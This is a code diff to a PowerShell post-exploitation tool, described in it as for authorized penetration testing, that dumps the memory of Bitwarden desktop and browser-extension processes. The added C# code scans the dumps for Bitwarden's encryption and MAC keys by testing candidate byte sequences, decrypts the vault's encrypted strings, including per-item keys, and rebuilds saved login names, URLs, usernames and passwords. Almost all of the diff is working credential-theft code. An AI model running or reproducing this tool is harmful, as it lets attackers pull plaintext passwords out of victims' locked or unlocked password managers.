@@ -1,4 +1,4 @@
-<#
+﻿<#
 .SYNOPSIS
     Bitwarden Post-Exploitation Tool for authorized penetration testing.
 .DESCRIPTION
@@ -208,8 +208,525 @@ namespace BW {
 }
 '@
 
+$dumpCryptoCode = @'
+using System;
+using System.IO;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Collections.Generic;
+using System.Security.Cryptography;
+
+namespace BW {
+
+    public class EncStringParsed {
+        public byte[] IV;
+        public byte[] Data;
+        public byte[] MAC;
+        public string Raw;
+    }
+
+    public class DecryptedEntry {
+        public string EncString;
+        public string Plaintext;
+        public bool IsPerItemKey;
+        public string KeySource;
+    }
+
+    public class FoundKey {
+        public byte[] EncKey;
+        public byte[] MacKey;
+        public long EncKeyOffset;
+        public long MacKeyOffset;
+        public int MatchedEncStrings;
+    }
+
+    public static class DumpCrypto {
+
+        public static EncStringParsed ParseEnc(string enc) {
+            if (enc == null || !enc.StartsWith("2.")) return null;
+            string[] parts = enc.Substring(2).Split('|');
+            if (parts.Length != 3) return null;
+            try {
+                var p = new EncStringParsed();
+                p.IV = Convert.FromBase64String(parts[0]);
+                p.Data = Convert.FromBase64String(parts[1]);
+                p.MAC = Convert.FromBase64String(parts[2]);
+                p.Raw = enc;
+                if (p.IV.Length != 16 || p.MAC.Length != 32) return null;
+                return p;
+            } catch { return null; }
+        }
+
+        public static List<string> ExtractEncStrings(string dumpPath) {
+            var result = new HashSet<string>();
+            var regex = new Regex(@"2\.[A-Za-z0-9+/=]{16,}\|[A-Za-z0-9+/=]{16,}\|[A-Za-z0-9+/=]{43,44}",
+                RegexOptions.Compiled);
+            using (var fs = File.OpenRead(dumpPath)) {
+                byte[] buf = new byte[10 * 1024 * 1024 + 4096];
+                long pos = 0;
+                while (pos < fs.Length) {
+                    fs.Position = pos;
+                    int read = fs.Read(buf, 0, buf.Length);
+                    if (read < 100) break;
+                    string text = Encoding.ASCII.GetString(buf, 0, read);
+                    foreach (Match m in regex.Matches(text)) {
+                        if (ParseEnc(m.Value) != null) result.Add(m.Value);
+                    }
+                    pos += 10 * 1024 * 1024;
+                }
+            }
+            return new List<string>(result);
+        }
+
+        static bool MacEquals(byte[] a, byte[] b) {
+            if (a.Length != b.Length) return false;
+            for (int i = 0; i < a.Length; i++) { if (a[i] != b[i]) return false; }
+            return true;
+        }
+
+        static byte[] ComputeMacInput(EncStringParsed p) {
+            byte[] input = new byte[p.IV.Length + p.Data.Length];
+            Buffer.BlockCopy(p.IV, 0, input, 0, p.IV.Length);
+            Buffer.BlockCopy(p.Data, 0, input, p.IV.Length, p.Data.Length);
+            return input;
+        }
+
+        static bool TestMacKey(byte[] key, byte[] macInput, byte[] expectedMac) {
+            using (var hmac = new HMACSHA256(key)) {
+                byte[] computed = hmac.ComputeHash(macInput);
+                return MacEquals(computed, expectedMac);
+            }
+        }
+
+        // Phase 1: Find macKey - fast path using V8 ArrayBuffer length prefix
+        // The key is stored as: [20 00 00 00] [32 bytes key data]
+        // Then fallback to full byte scan
+        public static FoundKey FindKeys(string dumpPath, List<string> encStrings, Action<string> log) {
+            // Prepare samples: pick up to 10 EncStrings with different MACs
+            var samples = new List<EncStringParsed>();
+            var seenMacs = new HashSet<string>();
+            foreach (string enc in encStrings) {
+                var p = ParseEnc(enc);
+                if (p == null) continue;
+                string macB64 = Convert.ToBase64String(p.MAC);
+                if (seenMacs.Contains(macB64)) continue;
+                seenMacs.Add(macB64);
+                samples.Add(p);
+                if (samples.Count >= 10) break;
+            }
+            if (samples.Count == 0) { log("[-] No valid EncStrings found"); return null; }
+            log("[*] Prepared " + samples.Count + " sample EncStrings for key search");
+
+            // Pre-compute MAC inputs
+            byte[][] macInputs = new byte[samples.Count][];
+            for (int i = 0; i < samples.Count; i++) {
+                macInputs[i] = ComputeMacInput(samples[i]);
+            }
+
+            // === FAST PATH: search for V8 ArrayBuffer prefix [20 00 00 00] ===
+            log("[*] Fast path: scanning for V8 ArrayBuffer key patterns...");
+            byte[] prefix = new byte[] { 0x20, 0x00, 0x00, 0x00 };
+            long macKeyOffset = -1;
+            byte[] confirmedMacKey = null;
+            int fastCandidates = 0;
+
+            using (var fs = File.OpenRead(dumpPath)) {
+                byte[] buf = new byte[10 * 1024 * 1024 + 36];
+                long pos = 0;
+                while (pos < fs.Length) {
+                    fs.Position = pos;
+                    int read = fs.Read(buf, 0, buf.Length);
+                    if (read < 36) break;
+
+                    for (int i = 0; i <= read - 36; i++) {
+                        if (buf[i] != 0x20 || buf[i+1] != 0x00 || buf[i+2] != 0x00 || buf[i+3] != 0x00) continue;
+                        fastCandidates++;
+
+                        byte[] candidateKey = new byte[32];
+                        Buffer.BlockCopy(buf, i + 4, candidateKey, 0, 32);
+
+                        // Test against all samples
+                        int matches = 0;
+                        for (int s = 0; s < samples.Count; s++) {
+                            if (TestMacKey(candidateKey, macInputs[s], samples[s].MAC)) matches++;
+                        }
+                        if (matches >= 2 || (matches >= 1 && samples.Count == 1)) {
+                            confirmedMacKey = candidateKey;
+                            macKeyOffset = pos + i + 4;
+                            log("[+] macKey FOUND (fast) at offset " + macKeyOffset + " (" + matches + "/" + samples.Count + " matches)");
+                            break;
+                        }
+                    }
+                    if (confirmedMacKey != null) break;
+                    pos += 10 * 1024 * 1024;
+                }
+            }
+            log("[*] Fast path tested " + fastCandidates + " candidates");
+
+            // === SLOW PATH if fast failed: full byte scan ===
+            if (confirmedMacKey == null) {
+                log("[*] Slow path: full byte-by-byte HMAC scan...");
+                using (var fs = File.OpenRead(dumpPath)) {
+                    byte[] buf = new byte[10 * 1024 * 1024 + 32];
+                    long pos = 0;
+                    long tested = 0;
+                    while (pos < fs.Length) {
+                        fs.Position = pos;
+                        int read = fs.Read(buf, 0, buf.Length);
+                        if (read < 32) break;
+
+                        for (int i = 0; i <= read - 32; i++) {
+                            byte[] candidateKey = new byte[32];
+                            Buffer.BlockCopy(buf, i, candidateKey, 0, 32);
+
+                            if (TestMacKey(candidateKey, macInputs[0], samples[0].MAC)) {
+                                int matches = 1;
+                                for (int s = 1; s < samples.Count; s++) {
+                                    if (TestMacKey(candidateKey, macInputs[s], samples[s].MAC)) matches++;
+                                }
+                                if (matches >= 2 || (matches >= 1 && samples.Count == 1)) {
+                                    confirmedMacKey = candidateKey;
+                                    macKeyOffset = pos + i;
+                                    log("[+] macKey FOUND (slow) at offset " + macKeyOffset + " (" + matches + "/" + samples.Count + " matches)");
+                                    break;
+                                }
+                            }
+                            tested++;
+                            if (tested % 10000000 == 0)
+                                log("[*] macKey scan: " + (tested/1000000) + "M offsets (" + (pos*100/fs.Length) + "%)");
+                        }
+                        if (confirmedMacKey != null) break;
+                        pos += 10 * 1024 * 1024;
+                    }
+                }
+            }
+
+            if (confirmedMacKey == null) { log("[-] macKey not found"); return null; }
+
+            // === Find encKey: collect EncStrings that match this macKey ===
+            var matchingEncs = new List<EncStringParsed>();
+            foreach (string enc in encStrings) {
+                var p = ParseEnc(enc);
+                if (p == null) continue;
+                if (TestMacKey(confirmedMacKey, ComputeMacInput(p), p.MAC)) {
+                    matchingEncs.Add(p);
+                    if (matchingEncs.Count >= 5) break;
+                }
+            }
+            log("[*] " + matchingEncs.Count + " EncStrings match the macKey, searching encKey...");
+
+            // === FAST PATH 1: search near macKey (±8KB) for encKey ===
+            byte[] confirmedEncKey = null;
+            long encKeyOffset = -1;
+
+            long searchStart = Math.Max(0, macKeyOffset - 8192);
+            long searchLen = 16384 + 32;
+            log("[*] Fast encKey search: ±8KB around macKey...");
+
+            using (var fs = File.OpenRead(dumpPath)) {
+                fs.Position = searchStart;
+                byte[] localBuf = new byte[(int)Math.Min(searchLen, fs.Length - searchStart)];
+                int read = fs.Read(localBuf, 0, localBuf.Length);
+
+                for (int i = 0; i <= read - 32; i++) {
+                    byte[] candidateEnc = new byte[32];
+                    Buffer.BlockCopy(localBuf, i, candidateEnc, 0, 32);
+                    if (!ValidateEncKey(candidateEnc, matchingEncs)) continue;
+                    confirmedEncKey = candidateEnc;
+                    encKeyOffset = searchStart + i;
+                    log("[+] encKey FOUND (fast-local) at offset " + encKeyOffset);
+                    break;
+                }
+            }
+
+            // === FAST PATH 2: V8 prefix scan of entire dump for encKey ===
+            if (confirmedEncKey == null) {
+                log("[*] V8 prefix encKey scan: full dump...");
+                using (var fs = File.OpenRead(dumpPath)) {
+                    byte[] buf = new byte[10 * 1024 * 1024 + 36];
+                    long pos = 0;
+                    while (pos < fs.Length) {
+                        fs.Position = pos;
+                        int read = fs.Read(buf, 0, buf.Length);
+                        if (read < 36) break;
+
+                        for (int i = 0; i <= read - 36; i++) {
+                            if (buf[i] != 0x20 || buf[i+1] != 0x00 || buf[i+2] != 0x00 || buf[i+3] != 0x00) continue;
+                            byte[] candidateEnc = new byte[32];
+                            Buffer.BlockCopy(buf, i + 4, candidateEnc, 0, 32);
+                            if (MacEquals(candidateEnc, confirmedMacKey)) continue;
+                            if (!ValidateEncKey(candidateEnc, matchingEncs)) continue;
+                            confirmedEncKey = candidateEnc;
+                            encKeyOffset = pos + i + 4;
+                            log("[+] encKey FOUND (V8 prefix) at offset " + encKeyOffset);
+                            break;
+                        }
+                        if (confirmedEncKey != null) break;
+                        pos += 10 * 1024 * 1024;
+                    }
+                }
+            }
+
+            // === SLOW PATH: byte-by-byte with staged validation ===
+            if (confirmedEncKey == null) {
+                log("[*] Slow encKey search: byte-by-byte...");
+                var firstEnc = matchingEncs[0];
+                using (var fs = File.OpenRead(dumpPath)) {
+                    byte[] buf = new byte[10 * 1024 * 1024 + 32];
+                    long pos = 0;
+                    long tested = 0;
+                    while (pos < fs.Length) {
+                        fs.Position = pos;
+                        int read = fs.Read(buf, 0, buf.Length);
+                        if (read < 32) break;
+
+                        for (int i = 0; i <= read - 32; i++) {
+                            byte[] candidateEnc = new byte[32];
+                            Buffer.BlockCopy(buf, i, candidateEnc, 0, 32);
+                            byte[] r1 = TryAesDecrypt(candidateEnc, firstEnc.IV, firstEnc.Data);
+                            if (r1 == null) continue;
+                            if (!ValidateEncKey(candidateEnc, matchingEncs)) continue;
+                            confirmedEncKey = candidateEnc;
+                            encKeyOffset = pos + i;
+                            log("[+] encKey FOUND (slow) at offset " + encKeyOffset);
+                            break;
+                        }
+                        if (confirmedEncKey != null) break;
+                        pos += 10 * 1024 * 1024;
+                        tested += 10 * 1024 * 1024;
+                        if (tested % (100 * 1024 * 1024) == 0)
+                            log("[*] encKey scan: " + (tested/(1024*1024)) + "MB (" + (pos*100/fs.Length) + "%)");
+                    }
+                }
+            }
+
+            if (confirmedEncKey == null) { log("[-] encKey not found"); return null; }
+
+            // Count total matching EncStrings
+            int totalMatch = 0;
+            foreach (string enc in encStrings) {
+                var p = ParseEnc(enc);
+                if (p != null && TestMacKey(confirmedMacKey, ComputeMacInput(p), p.MAC)) totalMatch++;
+            }
+
+            return new FoundKey {
+                EncKey = confirmedEncKey,
+                MacKey = confirmedMacKey,
+                EncKeyOffset = encKeyOffset,
+                MacKeyOffset = macKeyOffset,
+                MatchedEncStrings = totalMatch
+            };
+        }
+
+        static byte[] TryAesDecrypt(byte[] key, byte[] iv, byte[] data) {
+            try {
+                using (var aes = Aes.Create()) {
+                    aes.Key = key;
+                    aes.IV = iv;
+                    aes.Mode = CipherMode.CBC;
+                    aes.Padding = PaddingMode.PKCS7;
+                    using (var dec = aes.CreateDecryptor()) {
+                        return dec.TransformFinalBlock(data, 0, data.Length);
+                    }
+                }
+            } catch { return null; }
+        }
+
+        public static List<DecryptedEntry> DecryptAll(List<string> encStrings, byte[] encKey, byte[] macKey,
+            string keyLabel, Action<string> log) {
+            var results = new List<DecryptedEntry>();
+            var perItemKeys = new List<Tuple<byte[], byte[], int>>();
+            var undecrypted = new List<string>();
+            int piIdx = 0;
+
+            // Phase 1: direct decryption with provided key
+            foreach (string enc in encStrings) {
+                var p = ParseEnc(enc);
+                if (p == null) { undecrypted.Add(enc); continue; }
+                if (!TestMacKey(macKey, ComputeMacInput(p), p.MAC)) { undecrypted.Add(enc); continue; }
+                byte[] plain = TryAesDecrypt(encKey, p.IV, p.Data);
+                if (plain == null) { undecrypted.Add(enc); continue; }
+
+                bool isPIK = (plain.Length == 64);
+                if (isPIK) {
+                    byte[] piEnc = new byte[32]; byte[] piMac = new byte[32];
+                    Buffer.BlockCopy(plain, 0, piEnc, 0, 32);
+                    Buffer.BlockCopy(plain, 32, piMac, 0, 32);
+                    perItemKeys.Add(Tuple.Create(piEnc, piMac, piIdx++));
+                }
+                results.Add(new DecryptedEntry {
+                    EncString = enc,
+                    Plaintext = isPIK ? "[PER-ITEM-KEY#" + (piIdx-1) + "]" : SafeString(plain),
+                    IsPerItemKey = isPIK,
+                    KeySource = keyLabel
+                });
+            }
+            log("[+] Phase 1 (" + keyLabel + "): " + results.Count + " decrypted, " +
+                perItemKeys.Count + " per-item keys, " + undecrypted.Count + " remaining");
+
+            // Phase 2: per-item key cascade
+            if (perItemKeys.Count > 0 && undecrypted.Count > 0) {
+                var stillUndecrypted = new List<string>();
+                foreach (string enc in undecrypted) {
+                    var p = ParseEnc(enc);
+                    if (p == null) { stillUndecrypted.Add(enc); continue; }
+                    bool found = false;
+                    foreach (var pik in perItemKeys) {
+                        if (!TestMacKey(pik.Item2, ComputeMacInput(p), p.MAC)) continue;
+                        byte[] plain = TryAesDecrypt(pik.Item1, p.IV, p.Data);
+                        if (plain == null) continue;
+                        results.Add(new DecryptedEntry {
+                            EncString = enc,
+                            Plaintext = SafeString(plain),
+                            IsPerItemKey = false,
+                            KeySource = keyLabel + ":PIK#" + pik.Item3
+                        });
+                        found = true;
+                        break;
+                    }
+                    if (!found) stillUndecrypted.Add(enc);
+                }
+                log("[+] Phase 2 (per-item keys): +" + (undecrypted.Count - stillUndecrypted.Count) +
+                    " decrypted, " + stillUndecrypted.Count + " still encrypted");
+                undecrypted = stillUndecrypted;
+            }
+
+            return results;
+        }
+
+        // Try to find additional keys for remaining EncStrings (e.g., userKey after orgKey)
+        public static FoundKey FindAdditionalKey(string dumpPath, List<string> remaining,
+            byte[] excludeMacKey, Action<string> log) {
+            if (remaining.Count < 2) return null;
+            log("[*] Searching for additional key (" + remaining.Count + " remaining EncStrings)...");
+
+            var samples = new List<EncStringParsed>();
+            var seenMacs = new HashSet<string>();
+            foreach (string enc in remaining) {
+                var p = ParseEnc(enc);
+                if (p == null) continue;
+                string macB64 = Convert.ToBase64String(p.MAC);
+                if (seenMacs.Contains(macB64)) continue;
+                seenMacs.Add(macB64);
+                samples.Add(p);
+                if (samples.Count >= 10) break;
+            }
+            if (samples.Count == 0) return null;
+
+            byte[][] macInputs = new byte[samples.Count][];
+            for (int i = 0; i < samples.Count; i++) macInputs[i] = ComputeMacInput(samples[i]);
+
+            // Fast path
+            byte[] prefix = new byte[] { 0x20, 0x00, 0x00, 0x00 };
+            using (var fs = File.OpenRead(dumpPath)) {
+                byte[] buf = new byte[10 * 1024 * 1024 + 36];
+                long pos = 0;
+                while (pos < fs.Length) {
+                    fs.Position = pos;
+                    int read = fs.Read(buf, 0, buf.Length);
+                    if (read < 36) break;
+
+                    for (int i = 0; i <= read - 36; i++) {
+                        if (buf[i] != 0x20 || buf[i+1] != 0x00 || buf[i+2] != 0x00 || buf[i+3] != 0x00) continue;
+                        byte[] ck = new byte[32];
+                        Buffer.BlockCopy(buf, i + 4, ck, 0, 32);
+                        if (excludeMacKey != null && MacEquals(ck, excludeMacKey)) continue;
+
+                        int matches = 0;
+                        for (int s = 0; s < samples.Count; s++) {
+                            if (TestMacKey(ck, macInputs[s], samples[s].MAC)) matches++;
+                        }
+                        if (matches >= 2 || (matches >= 1 && samples.Count == 1)) {
+                            long macOff = pos + i + 4;
+                            log("[+] Additional macKey at offset " + macOff + " (" + matches + " matches)");
+                            // Find encKey nearby
+                            var matchEncs = new List<EncStringParsed>();
+                            foreach (string enc in remaining) {
+                                var p = ParseEnc(enc);
+                                if (p == null) continue;
+                                if (TestMacKey(ck, ComputeMacInput(p), p.MAC)) {
+                                    matchEncs.Add(p);
+                                    if (matchEncs.Count >= 3) break;
+                                }
+                            }
+                            if (matchEncs.Count == 0) continue;
+
+                            long ss = Math.Max(0, macOff - 8192);
+                            fs.Position = ss;
+                            byte[] lb = new byte[(int)Math.Min(16416, fs.Length - ss)];
+                            int r2 = fs.Read(lb, 0, lb.Length);
+                            for (int j = 0; j <= r2 - 32; j++) {
+                                byte[] ce = new byte[32];
+                                Buffer.BlockCopy(lb, j, ce, 0, 32);
+                                if (!ValidateEncKey(ce, matchEncs)) continue;
+                                int total = 0;
+                                foreach (string enc in remaining) {
+                                    var p = ParseEnc(enc);
+                                    if (p != null && TestMacKey(ck, ComputeMacInput(p), p.MAC)) total++;
+                                }
+                                return new FoundKey { EncKey = ce, MacKey = ck, EncKeyOffset = ss + j,
+                                    MacKeyOffset = macOff, MatchedEncStrings = total };
+                            }
+                        }
+                    }
+                    pos += 10 * 1024 * 1024;
+                }
+            }
+            return null;
+        }
+
+        static bool ValidateEncKey(byte[] candidate, List<EncStringParsed> matchingEncs) {
+            // Entropy check: real AES-256 key must have high entropy
+            var distinct = new HashSet<byte>();
+            foreach (byte b in candidate) distinct.Add(b);
+            if (distinct.Count < 12) return false;
+            // ALL matching EncStrings must decrypt with valid PKCS7
+            foreach (var enc in matchingEncs) {
+                byte[] result = TryAesDecrypt(candidate, enc.IV, enc.Data);
+                if (result == null) return false;
+            }
+            return true;
+        }
+
+        static string SafeString(byte[] data) {
+            try {
+                string s = Encoding.UTF8.GetString(data);
+                var sb = new StringBuilder();
+                foreach (char c in s) {
+                    if (c >= 32 && c < 127) sb.Append(c);
+                    else if (c == '\n' || c == '\r' || c == '\t') sb.Append(' ');
+                    else sb.Append('.');
+                }
+                return sb.ToString().Trim();
+            } catch { return "[binary:" + data.Length + "b]"; }
+        }
+
+        // Get remaining undecrypted EncStrings
+        public static List<string> GetRemaining(List<string> all, List<DecryptedEntry> decrypted) {
+            var decSet = new HashSet<string>();
+            foreach (var d in decrypted) decSet.Add(d.EncString);
+            var remaining = new List<string>();
+            foreach (string enc in all) {
+                if (!decSet.Contains(enc)) remaining.Add(enc);
+            }
+            return remaining;
+        }
+    }
+}
+'@
+
 try {
     Add-Type -TypeDefinition $csharpCode -ErrorAction Stop
+} catch {
+    if ($_.Exception.Message -notlike '*already exists*' -and
+        $_.Exception.InnerException -and
+        $_.Exception.InnerException.Message -notlike '*already exists*') {
+        throw
+    }
+}
+
+try {
+    Add-Type -TypeDefinition $dumpCryptoCode -ErrorAction Stop
 } catch {
     if ($_.Exception.Message -notlike '*already exists*' -and
         $_.Exception.InnerException -and
@@ -739,7 +1256,13 @@ function Scan-LevelDbForKeys {
 # ============================================================================
 
 function Scan-ProcessMemory {
-    param([System.Diagnostics.Process]$Target, [ref]$Credentials, [bool]$DoSaveDump, [string]$Label)
+    param(
+        [System.Diagnostics.Process]$Target,
+        [ref]$Credentials,
+        [bool]$DoSaveDump,
+        [string]$Label,
+        [ref]$DumpFilePath
+    )
 
     $owner = Get-ProcessOwner -ProcessId $Target.Id
     $memMB = [math]::Round($Target.WorkingSet64 / 1MB, 1)
@@ -765,11 +1288,9 @@ function Scan-ProcessMemory {
     $regions = [BW.Mem]::GetRegions($hProc)
     Write-Status "  Regions: $($regions.Count) | Readable: $([math]::Round(($regions | ForEach-Object { $_[1] } | Measure-Object -Sum).Sum / 1MB, 1))MB" "info"
 
-    $dumpStream = $null
-    if ($DoSaveDump) {
-        $dumpPath = "$($Target.ProcessName)_$($Target.Id).dmp"
-        $dumpStream = [System.IO.File]::Create($dumpPath)
-    }
+    # Always write a temp dump for crypto analysis; keep it if -SaveDump
+    $tempDump = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "bw_$($Target.Id)_$(Get-Random).raw")
+    $dumpStream = [System.IO.File]::Create($tempDump)
 
     $before = $Credentials.Value.Count
     foreach ($region in $regions) {
@@ -777,18 +1298,26 @@ function Scan-ProcessMemory {
         $size = [int][Math]::Min($region[1], 10 * 1024 * 1024)
         $data = [BW.Mem]::ReadRegion($hProc, $baseAddr, $size)
         if (-not $data -or $data.Length -eq 0) { continue }
-        if ($dumpStream) { $dumpStream.Write($data, 0, $data.Length) }
+        $dumpStream.Write($data, 0, $data.Length)
         $str = [System.Text.Encoding]::UTF8.GetString($data)
         Find-CredentialPatterns -Text $str -Credentials $Credentials
         $str16 = [System.Text.Encoding]::Unicode.GetString($data)
         Find-CredentialPatterns -Text $str16 -Credentials $Credentials
     }
-
-    if ($dumpStream) {
-        $dumpStream.Close()
-        Write-Status "  Dump saved: $dumpPath ($([math]::Round((Get-Item $dumpPath).Length / 1MB, 1))MB)" "good"
-    }
+    $dumpStream.Close()
     [BW.Mem]::Close($hProc)
+
+    $dumpSize = (Get-Item $tempDump).Length
+    Write-Status "  Memory captured: $([math]::Round($dumpSize / 1MB, 1))MB" "info"
+
+    if ($DumpFilePath) { $DumpFilePath.Value = $tempDump }
+
+    if ($DoSaveDump) {
+        $savedPath = "$($Target.ProcessName)_$($Target.Id).dmp"
+        Copy-Item $tempDump $savedPath -Force
+        Write-Status "  Dump saved: $savedPath" "good"
+    }
+
     $found = $Credentials.Value.Count - $before
     Write-Status "  Raw matches: $found" $(if ($found -gt 0) { "good" } else { "info" })
 }
@@ -802,6 +1331,8 @@ function Invoke-BWDump {
 
     # --- Desktop app processes ---
     $bwProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match '(?i)^bitwarden$' }
+    $dumpFiles = @()
+
     if ($TargetPid -gt 0) {
         $allProcs = Get-Process -ErrorAction SilentlyContinue
         $target = $allProcs | Where-Object { $_.Id -eq $TargetPid }
@@ -809,12 +1340,16 @@ function Invoke-BWDump {
             Write-Status "PID $TargetPid not found" "bad"
             return
         }
-        Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Manual PID"
+        $dmpPath = $null
+        Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Manual PID" -DumpFilePath ([ref]$dmpPath)
+        if ($dmpPath) { $dumpFiles += $dmpPath }
     } else {
         if ($bwProcs) {
             $target = $bwProcs | Sort-Object WorkingSet64 -Descending | Select-Object -First 1
             Write-Status "DESKTOP APP" "header"
-            Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Desktop"
+            $dmpPath = $null
+            Scan-ProcessMemory -Target $target -Credentials ([ref]$credentials) -DoSaveDump $DoSaveDump -Label "Desktop" -DumpFilePath ([ref]$dmpPath)
+            if ($dmpPath) { $dumpFiles += $dmpPath }
         } else {
             Write-Status "No Bitwarden desktop process found" "info"
         }
@@ -839,7 +1374,6 @@ function Invoke-BWDump {
             $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -match $browserPatterns[$browser] }
             if (-not $procs) { continue }
 
-            # Check if Bitwarden extension is installed for this browser
             $hasExt = $false
             if ($extIds.ContainsKey($browser)) {
                 $userData = switch ($browser) {
@@ -875,7 +1409,6 @@ function Invoke-BWDump {
             $browsersFound = $true
             $targets = @()
             if ($browser -ne "Firefox") {
-                # Chromium: find --extension-process instances (service workers + extension renderers)
                 foreach ($p in $procs) {
                     try {
                         $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($p.Id)" -ErrorAction SilentlyContinue).CommandLine
@@ -897,7 +1430,9 @@ function Invoke-BWDump {
             }
             foreach ($t in $targets) {
                 $before = $credentials.Count
-                Scan-ProcessMemory -Target $t -Credentials ([ref]$credentials) -DoSaveDump $false -Label "$browser ext"
+                $dmpPath = $null
+                Scan-ProcessMemory -Target $t -Credentials ([ref]$credentials) -DoSaveDump $false -Label "$browser ext" -DumpFilePath ([ref]$dmpPath)
+                if ($dmpPath) { $dumpFiles += $dmpPath }
                 if ($credentials.Count -gt $before) {
                     Write-Status "  Vault data found, skipping remaining $browser extension processes" "good"
                     break
@@ -909,22 +1444,165 @@ function Invoke-BWDump {
         }
     }
 
-    if ($credentials.Count -eq 0 -and -not $bwProcs -and -not $TargetPid) {
+    if ($credentials.Count -eq 0 -and -not $bwProcs -and -not $TargetPid -and $dumpFiles.Count -eq 0) {
         Write-Status "No Bitwarden processes (desktop or browser) found" "bad"
         return
     }
 
-    # Filter out EncStrings, garbage, and deduplicate
+    # Filter plaintext credentials
     $encStrRe = '^\d\.[A-Za-z0-9+/=\\]{10,}'
     $filtered = $credentials | Where-Object {
         $_.Username -notmatch $encStrRe -and $_.Password -notmatch $encStrRe -and
         $_.Password.Length -lt 300 -and $_.Username.Length -lt 200
     }
-    $unique = $filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique
+    $plaintextCreds = @($filtered | Sort-Object { "$($_.Username)|$($_.Password)" } -Unique)
+    if ($plaintextCreds.Count -gt 0) {
+        Write-Status "Found $($plaintextCreds.Count) plaintext credential(s)" "good"
+    } else {
+        Write-Status "No plaintext credentials (vault likely locked — running crypto extraction)" "info"
+    }
+
+    # ── Crypto extraction on each dump ──────────────────────────────────
+    $logAction = [System.Action[string]]{ param($msg) Write-Status $msg "info" }
+    $allCryptoDecrypted = @()
+
+    foreach ($dmpFile in $dumpFiles) {
+        if (-not (Test-Path $dmpFile)) { continue }
+        $dmpSize = (Get-Item $dmpFile).Length
+        if ($dmpSize -lt 1MB) { continue }
+
+        Write-Status "CRYPTO EXTRACTION ($([math]::Round($dmpSize / 1MB, 1))MB)" "header"
+
+        # Extract EncStrings
+        $encStrings = [BW.DumpCrypto]::ExtractEncStrings($dmpFile)
+        Write-Status "EncStrings found: $($encStrings.Count)" $(if ($encStrings.Count -gt 0) {"good"} else {"info"})
+
+        if ($encStrings.Count -lt 2) {
+            Write-Status "Not enough EncStrings for crypto extraction" "info"
+            continue
+        }
+
+        # Multi-round key discovery + decryption
+        $allDecrypted = [System.Collections.Generic.List[object]]::new()
+        $remaining = $encStrings
+        $keyRound = 0
+        $previousMacKey = $null
+
+        while ($remaining.Count -ge 2) {
+            $keyRound++
+            $keyLabel = "Key#$keyRound"
+            Write-Status "Searching for $keyLabel ($($remaining.Count) EncStrings)..." "info"
+
+            $foundKey = $null
+            if ($keyRound -eq 1) {
+                $foundKey = [BW.DumpCrypto]::FindKeys($dmpFile, $remaining, $logAction)
+            } else {
+                $foundKey = [BW.DumpCrypto]::FindAdditionalKey($dmpFile, $remaining, $previousMacKey, $logAction)
+            }
+
+            if (-not $foundKey) {
+                Write-Status "No more keys found ($($remaining.Count) EncStrings undecryptable)" "warn"
+                break
+            }
+
+            $previousMacKey = $foundKey.MacKey
+            Write-Status "$keyLabel found!" "good"
+            Write-Status "  encKey: $([Convert]::ToBase64String($foundKey.EncKey))" "info"
+            Write-Status "  macKey: $([Convert]::ToBase64String($foundKey.MacKey))" "info"
+            Write-Status "  Matching: $($foundKey.MatchedEncStrings) EncStrings" "info"
+
+            $roundResults = [BW.DumpCrypto]::DecryptAll($remaining, $foundKey.EncKey, $foundKey.MacKey, $keyLabel, $logAction)
+            foreach ($entry in $roundResults) { $allDecrypted.Add($entry) }
+            $remaining = [BW.DumpCrypto]::GetRemaining($remaining, $roundResults)
+            Write-Status "Round ${keyRound}: $($roundResults.Count) decrypted, $($remaining.Count) remaining" "info"
+
+            if ($keyRound -ge 5) { break }
+        }
+
+        # Collect decrypted values
+        $decryptedValues = @{}
+        foreach ($entry in $allDecrypted) {
+            if (-not $entry.IsPerItemKey -and $entry.Plaintext -and $entry.Plaintext.Length -gt 0 -and $entry.Plaintext.Length -lt 1000) {
+                $decryptedValues[$entry.EncString] = $entry.Plaintext
+            }
+        }
+
+        # Try cipher JSON association
+        $fileSize = $dmpSize
+        $cipherCreds = @()
+        $cipherJsonRe = [regex]::new('"id"\s*:\s*"[0-9a-f-]{36}"[^{}]{0,500}"login"\s*:\s*\{[^{}]{0,2000}\}', [System.Text.RegularExpressions.RegexOptions]::Compiled)
+        $nameRe  = [regex]::new('"name"\s*:\s*"(2\.[^"]+)"')
+        $userRe  = [regex]::new('"username"\s*:\s*"(2\.[^"]+)"')
+        $passRe  = [regex]::new('"password"\s*:\s*"(2\.[^"]+)"')
+        $uriRe   = [regex]::new('"uri"\s*:\s*"(2\.[^"]+)"')
+        $stream2 = [System.IO.File]::OpenRead($dmpFile)
+        $position = 0
+        while ($position -lt $fileSize) {
+            $readSize = [int][Math]::Min(10MB + 8192, $fileSize - $position)
+            $buf = New-Object byte[] $readSize
+            $stream2.Position = $position
+            $br = $stream2.Read($buf, 0, $readSize)
+            if ($br -eq 0) { break }
+            $chunk = [System.Text.Encoding]::ASCII.GetString($buf, 0, $br)
+            foreach ($cm in $cipherJsonRe.Matches($chunk)) {
+                $cj = $cm.Value
+                $nm = $nameRe.Match($cj); $um = $userRe.Match($cj); $pm = $passRe.Match($cj); $urlm = $uriRe.Match($cj)
+                if ($pm.Success -or $um.Success) {
+                    $cipherCreds += [PSCustomObject]@{
+                        Name     = if ($nm.Success -and $decryptedValues.ContainsKey($nm.Groups[1].Value)) { $decryptedValues[$nm.Groups[1].Value] } else { "" }
+                        URL      = if ($urlm.Success -and $decryptedValues.ContainsKey($urlm.Groups[1].Value)) { $decryptedValues[$urlm.Groups[1].Value] } else { "" }
+                        Username = if ($um.Success -and $decryptedValues.ContainsKey($um.Groups[1].Value)) { $decryptedValues[$um.Groups[1].Value] } else { "" }
+                        Password = if ($pm.Success -and $decryptedValues.ContainsKey($pm.Groups[1].Value)) { $decryptedValues[$pm.Groups[1].Value] } else { "" }
+                    }
+                }
+            }
+            $position += 10MB
+        }
+        $stream2.Close()
+
